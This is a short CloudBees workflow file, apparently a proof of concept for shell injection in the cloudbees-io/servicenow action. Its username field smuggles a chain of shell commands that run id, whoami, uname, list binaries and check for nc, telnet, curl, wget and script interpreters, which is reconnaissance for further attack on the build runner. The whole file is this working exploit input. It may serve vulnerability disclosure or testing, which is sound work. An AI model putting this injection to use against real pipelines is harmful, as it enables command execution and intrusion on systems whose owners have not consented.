apiVersion: automation.cloudbees.io/v1alpha1
kind: workflow
name: servicenow-shell-injection-poc
on:
  workflow_dispatch:
jobs:
  exploit:
    steps:
      - uses: cloudbees-io/servicenow@v1
        with:
          action-type: 'create_change'
          url: 'https://example.service-now.com'
          username: "x' & id; whoami; uname -a; ls /bin; ls /usr/bin; which nc telnet python python2 ruby perl php node nodejs busybox bash wget curl; :'y"
          password: 'testpass'
          cr-number: '12345'
